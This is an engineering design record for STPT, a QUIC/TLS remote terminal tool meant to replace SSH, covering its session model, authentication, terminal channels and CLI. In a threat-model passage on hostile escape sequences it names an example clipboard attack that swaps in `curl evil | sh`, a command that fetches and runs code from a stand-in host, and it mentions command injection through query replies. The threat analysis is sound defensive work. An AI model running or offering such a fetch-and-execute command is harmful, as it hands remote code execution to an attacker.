# STPT Design Decisions

Status: working record of design decisions and open questions. Not a normative wire protocol specification.
Origin: translated from the Russian summary "STPT_Decisions_v0.1" (2026-10-10) and extended with later decisions.
Everything here is open to discussion unless fixed in docs/RULES.md.

Marks: ✅ decided, ❓ open. Each mark carries a date.

# 1	Purpose
STPT is a standalone secure tool for remote terminal access and related operations, intended as an alternative to SSH.
The goal is not wire compatibility with SSH, but keeping its successful ideas while improving the session model and adding capabilities.
Do not create differences for the sake of differences.

- ❓ Final expansion of the name: "Secure Terminal Processor Tools" or "Secure Terminal Processing Tools".

# 2	Repositories and licensing
- ✅ 2026-10-10 Two independent repositories: `stpt` (Rust application, GPLv3) and `stpt-protocol` (protocol description, CC0 1.0).
- `stpt-protocol` contains documentation only. Formal message schemas, examples and test vectors are allowed later.
- The specification must be sufficient to build an independent implementation without reading the Rust sources.
- The protocol specification (`stpt-protocol/specs`) and the description of the implementation (`stpt/docs/ARCHITECTURE.md`) must not substitute for each other.

# 3	Platforms
- Application language: Rust.
- Primary platforms: Windows 11 x86-64 and Debian-based Linux x86-64.
- One source project; each platform build is a single binary acting as client and server, mode selected via CLI. Builds are platform-specific.
- Interactive terminal: PTY on Linux; ConPTY for a future Windows server mode.
- ✅ 2026-10-14 The command line is the same on every platform; Windows builds keep the `server` subcommand and refuse it with an error (gate G2) until RC008, instead of hiding it (RA003).

# 4	Architectural model
- Endpoint, Client, Server, Connection, Channel, Stream, Identity, Account, Authentication Context, Session, Attachment and Retention Policy are distinct concepts (see PROTOCOL.md §1, §2).
- ✅ 2026-10-11 A Session is a server-side execution context owned by an Account, not only a terminal; the terminal is one of its Channels.
- ✅ 2026-10-11 Persistence is not a kind of Session: every Session is independent of Connections, and its life without an Attachment is set by the server Retention Policy. A new Connection may attach to it after authorization.
- ✅ 2026-10-11 Channel (logical service: control, terminal, files, other) and Stream (transport unit) are separate terms. Channels use bidirectional streams carrying framed messages (PROTOCOL.md §7.1); the control stream: PB004.
- ✅ 2026-10-11 The control Channel is client stream 0 and lives as long as the Connection; other Channels open with CHANNEL_OPEN on a new stream; before authentication QUIC stream limits allow only the control stream (PROTOCOL.md §8).
- ✅ 2026-10-11 State model (PROTOCOL.md §3): Authenticated is a Connection state, not only a property; until it only the control Channel is available. A Session has an Exited state that keeps the exit status for later Attachments under Retention Policy.
- ✅ 2026-10-11 A Connection is not bound to a network path: QUIC connection migration keeps the Connection; after Connection loss a new Connection is required.
- ✅ 2026-10-13 Terminal Channel (PROTOCOL.md §14): channel kind 1; other kinds (file transfer, client file access, port forwarding) assigned by their Tiers; Session and audit are not channel kinds. Opened only by the Client; opening = attach to a new or existing Session, closing = detach; Session termination is a control request. One Session has one terminal. Command execution without a PTY is a mode of the terminal Channel, not a separate kind. One bidirectional stream with in-band input, output, resize, signals and exit status; input is not split off (ordering). A Connection may have zero terminal Channels; the maximum is a Server limit via MAX_STREAMS (default 10). Message types are not limited to 255; frequent ones use one-byte CBOR values 1–23.
- ✅ 2026-10-13 Terminal parameters (PROTOCOL.md §14.6): PTY and command are independent fields; command as a string (run by the Account's shell) or as an argument vector (run directly, no quoting injection); TERM restricted to 1–64 bytes `[A-Za-z0-9][A-Za-z0-9._+-]*`; size 1–65535 cells, optional pixels; termios not transmitted, Server defaults with UTF-8 input; environment only through a Server allowlist (default `LANG`, `LC_*`), others ignored silently, the Client never forwards its whole environment; on attach only the size is allowed.
  - ✅ 2026-10-18 The argument vector also runs through the Account's shell, each element quoted for a POSIX shell (draft-28; found in RC002). Run directly, it would bypass a disabled or restricted shell (`nologin`, `git-shell`), which ssh respects for every command. The elements still reach the program unchanged.
  - ✅ 2026-10-18 Implementation of terminal I/O (RC001–RC003, `stpt` README, ARCHITECTURE §10). User decision: until the Session store of Tier RD a Session lives as long as its Channel; a detach or a lost Connection ends it by closing the PTY (SIGHUP, as a closed terminal), an attach finds no Session (SESSION_NOT_FOUND). My choices: `connect` uses a PTY and the login shell, `exec` no PTY and one command line as ssh (`--no-shell`: argument vector); the Client exits with the remote exit code, 255 after a signal as ssh; exit grace 1 s; output read in pieces of up to 16 KiB, each written before the next read (flow control is the backpressure); TERMINAL_RESIZE and TERMINAL_SIGNAL validated now, applied with RC004/RC005. Client raw mode and console I/O written on `nix` and `windows-sys` instead of `crossterm`, whose Windows input is key events rather than the VT byte stream a remote PTY needs; Windows output goes through WriteFile in the UTF-8 code page, as the standard library's console writer rejects bytes that are not UTF-8.
- ✅ 2026-10-13 Terminal I/O (PROTOCOL.md §14.7): TERMINAL_DATA both ways as opaque bytes; stderr without a PTY as a separate type TERMINAL_STDERR, so an implementation unaware of it fails closed instead of mixing streams; TERMINAL_EOF only without a PTY (stream FIN would block later signals); backpressure by QUIC flow control while attached; output of a detached Session: Tier PD. One-byte CBOR types 1–23 only for frequent messages.
- ✅ 2026-10-13 Terminal resize (PROTOCOL.md §14.8): TERMINAL_RESIZE (type 25) from the Client only, with a PTY only, same keys as pty-params, no reply; the Client coalesces bursts, the Server may apply only the last size and limit the rate; size choice with several Attachments: PD003.
- ✅ 2026-10-13 Signals (PROTOCOL.md §14.9): TERMINAL_SIGNAL (type 26) from the Client, no reply; STPT signal ids, not OS numbers: INT, QUIT, HUP, TERM, KILL, USR1, USR2; changes to the set only through a new roadmap item and a capability. Target: PTY foreground process group, or the process group of a command without a PTY. Delivered with the permissions of the Account, never of the Server process.
- ✅ 2026-10-13 Exit and close (PROTOCOL.md §14.10): TERMINAL_EXIT (type 27) with exit code (up to 32 bits) or signal id; report-only signal ids ABRT, SEGV, PIPE, BUS, FPE, ILL, ALRM, id 0 = other; output drained for at most a grace period (1 s) after the primary process exits, avoiding the OpenSSH hang on background processes; Client FIN = detach, not EOF; Client messages crossing TERMINAL_EXIT are ignored. A Session whose exit status was delivered (e.g. after `exit` in the shell) should be removed at once, so it cannot be attached again: final rule PD002.
- ✅ 2026-10-13 Session ID and ownership (PROTOCOL.md §15): ID of 16 random bytes generated by the Server, text form 32 lowercase hex digits; a counter was rejected, since after a Server restart an old ID could reach a new Session; the Client may accept a unique prefix. The ID is not a secret and grants no access; another Account's Session is answered exactly as an unknown ID (SESSION_NOT_FOUND). Owner is the Account, not the key: every key authorized for the Account reaches all its Sessions (finer rights: Tier PI); no cross-Account access through the protocol. Optional Session name for users, set at creation, unique within the Account; the protocol addresses Sessions by ID only. The Server sets `STPT_SESSION` inside the Session.
- ✅ 2026-10-13 Session lifecycle (PROTOCOL.md §8.4, §15.5–§15.8): no create request (terminal-open without ID; a detached start is Client behaviour); detach = Client FIN or closed Connection, so closing the local terminal window detaches, while `exit` or Ctrl-D ends the Session; generic control requests with a Client-chosen request ID and one REQUEST_RESULT each, in any order; SESSION_TERMINATE: HUP (PTY) or TERM (no PTY), KILL after 5 s, optional force; an Exited Session is Terminated once a Client confirms TERMINAL_EXIT by FIN, otherwise kept until a later Attachment or 24 h; processes left after the primary process exits are not signalled (Unix semantics; killing everything by cgroup rejected as rarely wanted); detached output is always read so processes never block, what is kept: PD005; defaults: detached Running unlimited, at most 64 Sessions per Account; Sessions do not survive a Server restart (restarts are rare and deliberate).
- ✅ 2026-10-13 Attachments (PROTOCOL.md §15.9): attach only by the owner Account, to Running or Exited Sessions; several Attachments per Session (default 8), both modes available and chosen per attach: shared (default, as `tmux attach`) and takeover (as `tmux attach -d`); read-only Attachments as a convenience, not a boundary; terminal size of the last active Attachment (as tmux 3.1+, "smallest" rejected: one small window shrinks everyone); input of all Attachments merged in arrival order; an Attachment stalled by flow control for 10 s is reset with TIMEOUT, so a stalled Client never blocks the Session.
- ✅ 2026-10-13 Session list (PROTOCOL.md §15.10): own Account only, states Running, Exited, Terminating; one Session by ID or all, paged by Session ID to fit the message size; fields: ID, name, state, creation time, creating key and its Server label, PTY, command for display (cut to 256 bytes), exit status (listing does not count as delivery), removal time, Attachments with ID, time, key, label, read-only, active, Client address. Address shown since `who`/`last` show it even to other Accounts; drawback accepted: members of a shared Account see each other's addresses.
- ✅ 2026-10-13 Reattach (PROTOCOL.md §15.11, §15.12): the Server must allow QUIC migration, so a network change keeps the Connection; after a lost Connection a new one with full authentication, no resume token; the Client may detach its own old Attachment by ID, not by takeover. The Server always keeps a raw output ring buffer (256 KiB) with offsets counted from Session start; resume by offset continues without loss or duplicates (as Eternal Terminal); a fresh attach replays at most 16 KiB from the first line feed, then SIGWINCH makes full-screen programs redraw. A Server-side terminal emulator (as tmux) rejected: a full escape-sequence parser is attack surface and would have to be specified. The same buffer gives the last output of an Exited Session. Loss detection and retries are Client behaviour (RD007).
- ✅ 2026-10-13 File transfer includes file management (as sftp, not only scp); all operations run with the Account's permissions, no elevation through the protocol (PE002).
- ✅ 2026-10-13 Client exit code of `stpt exec`: the remote exit code; 128 + local signal number if terminated by a signal; 255 on an STPT or Connection error (as ssh).
- SSH already multiplexes channels. The QUIC advantage is, among others, independent loss recovery per stream.

# 5	Transport and connection establishment
- ✅ 2026-10-10 QUIC over UDP with TLS 1.3. Candidate Rust library: `quinn` (with `rustls`).
- ✅ 2026-10-17 Implementation (RB001, RB002, `stpt` ARCHITECTURE §6): `quinn` with `rustls` and the `aws-lc-rs` provider (the `ring` provider has no X25519MLKEM768). `rustls` selects the first group in the Client's order, so the Server cannot force the hybrid group; a Client preferring X25519 while offering X25519MLKEM768 is rejected instead, and PROTOCOL.md §6.2 now requires the Client order (draft-23). `stpt` uses no TLS session resumption: a Client process makes one Connection, and a resumed handshake carries no Server signature.
- ✅ 2026-10-17 Implementation of HELLO and negotiation (RB004 and RB005 together, as HELLO needs framing and already selects the version; `stpt` ARCHITECTURE §8). User decisions: both items in one step; framing and the CBOR codec come with them, RB007 keeps the life of the control stream after Established. Own strict CBOR codec instead of a library: STPT uses a small subset, and §7.4 needs a validating pass with any library (`ciborium` accepts indefinite lengths, duplicate keys and floats; `minicbor` would bring unused float and tag code and a BlueOak license). The decoder also rejects every non-deterministic encoding (MAY in §7.4): arguments longer than needed, map keys out of order. My choices: the Client sends one random GREASE version and capability in every CLIENT_HELLO; limits are sent only when they differ from the default. Spec refinements found on the way (draft-25): GREASE values are 16 per kind with a repeated digit, as in RFC 8701; the Client also has a 10 s deadline for SERVER_HELLO, since keep-alive would otherwise hold a silent Connection forever.
- ✅ 2026-10-17 Implementation of the control stream (RB007, `stpt` ARCHITECTURE §8). One table (`control::check`) says which message type each side may send in which Connection state; an unknown type, a Channel message on the control stream or a message out of state or direction is a protocol violation on both sides. The request envelope of §8.4 is included, as it belongs to the control stream: request ID required, REQUEST_RESULT with ID and code; until the operations exist (Tier RD) every request is answered with INTERNAL_ERROR and the Connection stays open. Tracking of outstanding requests (duplicate IDs, limit 16) comes with the first request that does not answer at once (RD). Channel streams after authentication must start with CHANNEL_OPEN; no channel kind exists yet, so each Channel is rejected with CHANNEL_REJECTED. Control stream send priority 1, Channel streams 0. Spec refinement (draft-27): streams that end or are reset before CHANNEL_OPEN. Tier RB is complete with it.
- Order: QUIC/TLS handshake and server identity verification → STPT HELLO → version and capability negotiation → user authentication → Session create/attach.
- ✅ 2026-10-11 HELLO: one round trip CLIENT_HELLO → SERVER_HELLO on the control stream; the Server is silent until CLIENT_HELLO; HELLO is unsigned (protected by TLS); no implementation name or version anywhere in the protocol, unlike the SSH banner (PROTOCOL.md §10).
- No STPT banner or any application data is sent before the cryptographic channel is established.
- This does not make the protocol invisible: IP addresses, traffic metadata and QUIC itself remain observable. QUIC Initial packets are only obfuscated (their keys are derivable by anyone).
- ✅ 2026-10-10 ALPN and SNI travel in cleartext in the ClientHello. Where this exposes too much, Encrypted Client Hello (ECH) is to be used. Server-side ECH is restricted by gate G1.
- ✅ 2026-10-11 No 0-RTT at all, not even HELLO (supersedes 2026-10-10 "at most HELLO"): replay risk and capability exposure outweigh one saved round trip. May be relaxed later through a capability (PROTOCOL.md §6.5).
- ✅ 2026-10-11 TLS 1.3 profile: AES-128-GCM and ChaCha20-Poly1305 mandatory; key exchange X25519 mandatory, hybrid X25519MLKEM768 recommended and preferred; no client certificates; resumption only with (EC)DHE and never restores user authentication (PROTOCOL.md §6.2).
- QUIC connection migration (address change) and Session recovery after full connection loss are different mechanisms; both are in scope.
- ✅ 2026-10-11 Default port: dedicated UDP 843 (unassigned in the IANA registry; privileged, so not bindable by unprivileged local users). Sharing UDP 443 with HTTP/3 is not the default; the port is configurable (PROTOCOL.md §6.6).
- ❓ IANA registration of the ALPN token `stpt` (Expert Review) and of a port (system ports need IETF Review or IESG Approval, RFC 6335; a different number may be assigned): deferred until the specification is stable.
- ❓ 2026-10-17 Reason phrase before authentication: §13.1 requires it empty, but `quinn` puts the TLS library's error text into the reason of the transport CONNECTION_CLOSE when a handshake fails (e.g. `invalid peer certificate: UnknownIssuer`, found with RB003; hard-coded in quinn-proto, both roles). Options: scope §13.1 to application closes, or wrap the QUIC crypto session in `stpt` to clear the text. ✅ 2026-10-17 §13.1 scoped to closes initiated by the STPT implementation; text the QUIC or TLS implementation adds on its own is outside the rule, SHOULD be suppressed where possible, and is diagnostics only for the receiver (draft-24). A wrapper of the quinn crypto session would clear only TLS errors, not quinn's other transport errors, so full suppression would need a patched quinn; `stpt` keeps quinn's text for now.

# 6	Authentication and security
- No custom cryptographic algorithms; only proven TLS and cryptographic implementations.
- ✅ 2026-10-11 Server identity: Ed25519 key presented as a TLS Raw Public Key (RFC 7250), no X.509; fingerprint `SHA256:<base64>` over SPKI, always compared in full; TOFU with SSH known_hosts-like UX, keyed by address and port; first contact needs user confirmation or an out-of-band fingerprint; a changed key aborts the Connection (PROTOCOL.md §9).
- ❓ Server key rotation (e.g. new key signed by the old one, sent after the handshake): ✅ 2026-10-13 needed, also for the move to post-quantum keys: PI003.
- ❓ Post-quantum or hybrid Server Identity keys (e.g. ML-DSA): ✅ 2026-10-13 needed: PI005.
- ❓ CA model with X.509 certificates as an alternative to TOFU: ✅ 2026-10-13 needed with low priority (an organization's own CA for Server and short-lived user certificates, for many Servers and users): PI006.
- ✅ 2026-10-10 User authentication happens at the STPT application layer after the TLS handshake. The client proves possession of its key by signing a value obtained from the TLS exporter of the current Connection (channel binding), so the proof cannot be reused on another Connection.
- ✅ 2026-10-11 User authentication: only Ed25519 public keys; one-step AUTH_REQUEST with a signature over a CBOR structure containing a TLS exporter value (label `EXPORTER-STPT-user-auth`); no key probing; uniform failure; the Account of a Connection never changes (PROTOCOL.md §12).
- ✅ 2026-10-13 Rejection diagnostics: all checks of AUTH_REQUEST are performed before one decision, the signature is verified even for a nonexistent Account (no timing leak); exact rejection reasons go only to the Server log (PROTOCOL.md §12.4, §13.1). Rejected: a switchable "strict" mode with one message for every refusal, and rejection deferred over all login stages until a final check. Stages before authentication hold no secrets (the specification and code are public, Kerckhoffs), some cannot be passed without agreement (no common TLS algorithm or version), continuing after a violation breaks fail closed and holds resources for every bot (DoS), the stage is visible from the message sequence anyway, and legitimate users would lose diagnostics such as a version mismatch; after authentication the peer already holds the Account.
- ✅ 2026-10-17 Implementation of user authentication (RB006, `stpt` README, ARCHITECTURE §9). User decisions: authorized keys are kept by the administrator only, one file per Account in `/etc/stpt/authorized_keys/` (no files in home directories); the user key is made with `openssl genpkey -algorithm ed25519` for now, so `stpt keygen` stays in RI001 and PI001/RI002 stay in Tier PI/RI. Format chosen with it (PI001 will build on it): one key per line, base64 of the SubjectPublicKeyInfo (second line of `openssl pkey -pubout`, the same encoding as the trust store) and an optional label of 1–64 bytes. My choices: directory and file must be owned by root (or the Server user) and not writable by group or others, otherwise ignored; an invalid line invalidates the file; Account names that are not plain file names count as unknown Accounts; a failed attempt is answered no earlier than 300 ms after its AUTH_REQUEST, so the response time does not depend on the reason (§12.4); an unoffered method is a protocol violation; after authentication streams are allowed (1 + 10) and rejected with CHANNEL_REJECTED until Channels exist; valid messages that are not implemented yet close with INTERNAL_ERROR, not PROTOCOL_VIOLATION. Account lookup with `getpwnam` through `nix`. The Client shows the authorized keys line of its key when it is refused. Spec refinement (draft-26): Client deadline 10 s for AUTH_RESULT.
- ✅ 2026-10-11 No password authentication. To be reconsidered only on user demand, as a capability.
- Short-lived certificates, CA: promising, not required for the first MVP. Hybrid post-quantum key exchange: see §5.
- Authorization of Session attach and of client file system operations must be defined explicitly.
- The server never gets access to client files merely because a Connection exists.
- ❓ Security model of mounting a client directory on the server (reverse mount) requires a separate analysis: PF004.
  - ✅ 2026-10-13 Direction: the Client warns that root on the Server can read the mounted files and requires an explicit `yes`; the mount ends at detach or Session end.

# 7	Features
Core:
- secure connection to a remote terminal;
- full interactive PTY session: resize, control signals, terminal applications;
- persistent sessions: create, list, detach, reattach, terminate.

Later:
- native file transfer over STPT;
- requesting client files from a remote terminal session, with permissions only;
- mounting a client directory on the server (Linux FUSE; Windows needs a separate solution);
- session audit and terminal I/O recording;
- port forwarding;
  - ✅ 2026-10-13 Local, remote and dynamic (SOCKS) forwarding; UDP forwarding only on request (roadmap backlog), as ssh has none.
- additional identity, deployment and hardening models.

Keystroke recording is not a reliable log of executed shell commands; secret handling and audit boundaries need separate design.
- ✅ 2026-10-13 Purpose of input recording: quick access to the command history of a Session through an STPT subcommand; input typed with echo off (passwords) is excluded. Recorded on the Server, not a separate stream of the terminal Channel.
- ❓ Protection of the Client terminal emulator against hostile escape sequences in output: to be analysed in Tier PJ. The protocol passes output unfiltered, like SSH (PROTOCOL.md §14.7). Threats from a hostile Server or a compromised process on it:
  - OSC 52: silent write to the Client clipboard, e.g. replacing a copied command with `curl evil | sh`;
  - query sequences whose replies come back as input (window title, status reports): with a title set beforehand this is command injection (past CVEs in xterm, iTerm2 and others);
  - OSC 8 hyperlinks whose visible text differs from the target.
  - ✅ 2026-10-13 No filtering in the protocol and no full escape-sequence parser: the Server cannot tell legitimate from hostile sequences, and a complex parser is new attack surface. Direction for PJ: an optional Client-side block of a small set of dangerous sequences (OSC 52 writes, queries with replies), leaving everything else intact; not applied when output goes to a file or pipe.
- ❓ How to extract commands reliably (raw keystrokes vs shell integration such as OSC 133 prompt marks): PH003.
  - ✅ 2026-10-13 Password exclusion is detected by the terminal mode, not by prompt text: input while the PTY has echo off is never recorded (sudo, passwd, `read -s`). Keystrokes cannot reconstruct commands (completion, history recall, line editing), so if keystroke history proves unreliable it is dropped and only the command history is kept.

# 8	CLI
- ✅ 2026-10-10 Commands are explicit: every operation has its own subcommand; no implicit forms such as `stpt user@host`.
- Preliminary shape (syntax not fixed):
  ```
  stpt server --listen <addr>:<port>
  stpt connect user@host[:port] [--new | --attach <session-id>]
  stpt sessions user@host
  stpt exec user@host "command"
  stpt fs pull|push|mount ...
  stpt keygen
  ```
- ✅ 2026-10-13 CLI skeleton (RA002, `stpt` README): `server`, `connect`, `exec`, `sessions`, `detach`, `terminate`; `connect` creates a Session unless `--attach` is given (no `--new`); `exec` joins its arguments into a shell command line as ssh does, `--no-shell` sends them as an argument vector; the Account in `account@host` is required; exit codes 2 for usage errors, 255 for STPT errors. `fs` and `keygen` come with their Tiers.
- ✅ 2026-10-14 Configuration (RA004, `stpt` README): TOML, separate files for Server (`/etc/stpt/server.toml`) and Client (XDG config directory, `%APPDATA%` on Windows), `--config` replaces the default; command line over file over built-in default; unknown keys and invalid values are errors (fail closed), a missing default file is not.
- ✅ 2026-10-14 Logging and errors (RA005, `stpt` ARCHITECTURE §5): `tracing` to standard error, no own log files (systemd journal); levels `-q`, `-v`…`-vvv`, Server `log_level`; peer input only Debug-escaped in the log; final error printed once as `stpt: <error>`.
- ✅ 2026-10-17 Server Identity and trust store (RB003, `stpt` README, ARCHITECTURE §7). User decisions: the Server creates its key at the first start (`/etc/stpt/server_key`, setting `identity_key`; owner-only, a key file readable by others is refused), `stpt server --fingerprint` prints the fingerprint; first contact is confirmed by typing `yes`; the trust store is `known_servers` next to the Client configuration; an entry is replaced only after `stpt trust remove HOST[:PORT]` (`stpt trust list` shows entries). My choices: `--fingerprint SHA256:...` on every Client command with a destination, a key verified by it is stored; at first contact the handshake is aborted and repeated after the confirmation, so no Server deadline runs while the user reads; trust store addresses are normalized (DNS names in lower case, canonical IP addresses).
- ✅ 2026-10-13 Explicit detach is Client behaviour, not protocol (the protocol only defines Client FIN = detach, PROTOCOL.md §14.10). The `stpt` console Client intercepts an escape sequence, ssh-style `Enter ~ .` (`~~` sends `~`, `~?` help, escape character configurable or disabled); final key choice during the test implementation (RD002). Graphical Clients use their own controls. Escape sequences are a feature of a client program, not of a protocol (e.g. Termius does not implement OpenSSH `~.`).
- ✅ 2026-10-13 Rejected: detach by a command inside the Session (`stpt detach --current-session`): works only at a shell prompt, lets any process in the Session control Attachments (trust boundary), and cannot tell which of several Attachments to end.
- ✅ 2026-10-13 Closing the local terminal window detaches; detached Sessions are kept and can accumulate. The user documentation (help, man, README) MUST say so: the user is expected to know the program. The Client configuration has a detach timeout sent at Session creation; the Server applies the smaller of it and its own policy (PROTOCOL.md §15.8).
- ✅ 2026-10-13 Detach from another window: control request SESSION_DETACH for all Attachments of a Session or one by its Attachment ID (CLI e.g. `--all`, `--id`); IDs come from TERMINAL_ATTACHED and the Session list. No "all but mine": that is a command from inside the Session; the same intent is the takeover mode at attach. Server-initiated detach is a Server FIN without TERMINAL_EXIT, no reason message (PROTOCOL.md §15.9).

# 9	Versioning and terminology
- Application version, wire protocol version, Tier and Gate are different entities.
- ✅ 2026-10-11 Requirements language BCP 14 (RFC 2119, RFC 8174); security requirements only as MUST / MUST NOT; OPTIONAL features never lower security; peer input untrusted, violations fail closed (PROTOCOL.md §0).
- ✅ 2026-10-11 Wire protocol version is a single integer; optional features via capabilities; draft versions disjoint from final; no fallback to a lower version; deprecated versions are never offered (PROTOCOL.md §5).
- ✅ 2026-10-11 The ALPN token is `stpt` without a version; the version is negotiated inside TLS (PROTOCOL.md §6.3).
- ✅ 2026-10-17 RK006 (Windows Server mode) cancelled: Windows 11 is a primary platform and the binary provides both roles there (RULES.md §1.3), so Windows Server mode moves into the Terminal MVP as RC008, next to the Linux PTY; installation as a Windows service stays in packaging as RK007.
- ✅ 2026-10-14 RA006 (local client ↔ server prototype) cancelled: Tier RA precedes QUIC and TLS, so it cannot show a real link, and a link without TLS would violate RULES.md §1.8. If a prototype item is needed later, it is added to Tier RB or a later Tier, never to RA.
- ✅ 2026-10-13 Tiers PE–PK and RE–RK filled with items; each roadmap has a backlog for items taken up only on request.
- ✅ 2026-10-11 The roadmap is split into two tracks: protocol (P, docs/ROADMAP.md) and realisation (R, stpt/docs/ROADMAP.md). R items depend on P items explicitly; the protocol is specified ahead of the implementation.
- Tiers, items and gates: see docs/RULES.md §1.4, docs/ROADMAP.md, stpt/docs/ROADMAP.md, docs/GATES.md.

# 10	MVP on a local VM
First verifiable result:
- STPT server on a local Debian VM, STPT client on Windows 11;
- secure QUIC/TLS connection, server identity verification, minimal user authentication;
- bash through a PTY: interactive I/O, resize, Ctrl+C, nano/htop work;
- clean session termination.

Next experiment:
- open a Session, start a long-running process, drop the Connection;
- verify the process and PTY survive;
- open a new Connection and attach to the same Session.

# 11	Open questions before protocol work
- ✅ 2026-10-10 Message encoding: CBOR (RFC 8949) with CDDL schemas (RFC 8610).
- ✅ 2026-10-11 Framing: QUIC varint length + one CBOR message `[type, {int => any}]`; deterministic encoding, strict receiver rules; bidirectional streams only; bulk data always inside framed messages, no raw byte streams (PROTOCOL.md §7).
- ✅ 2026-10-11 Negotiation and extensions: draft wire versions 0xFF000000 + N (current 0xFF000001); the Server selects the highest common final, else common draft version; capabilities are a map id → parameters, offered by the Client and selected by the Server; one message type space with core, capability and private ranges; unknown message types close the Connection; GREASE values reserved (PROTOCOL.md §11).
- ✅ 2026-10-11 Server identity and first-contact trust (§6). Key rotation: ❓ §6.
- ✅ 2026-10-11 User authentication methods (§6). ❓ Access rights within an Account (Tier PI).
- ✅ 2026-10-13 Session ID and ownership (§4). ✅ 2026-10-13 Lifetimes, create, detach, terminate (§4). ✅ 2026-10-13 Attach authorization, concurrent access (§4). ✅ 2026-10-13 Session list, reattach (§4).
- ✅ 2026-10-11 Errors via QUIC CONNECTION_CLOSE / RESET_STREAM codes, no error message; no reason text before authentication; timeouts HELLO 10 s, authentication 60 s, idle 60 s with client PING every 15 s; limits announced in HELLO (message size ≥ 65535), nesting depth 16, 6 auth attempts; QUIC Retry and limits on unauthenticated Connections (PROTOCOL.md §13).
- ❓ How a command inside the remote shell reaches the client without breaking trust boundaries.
- ❓ Audit format and security, including password and secret input.
- ❓ Interoperability of independent implementations and test vectors.

# 12	Working principle
First define the state model and responsibility boundaries, then the wire format, only then the implementation.
Start with a narrow MVP verifiable on a local VM.
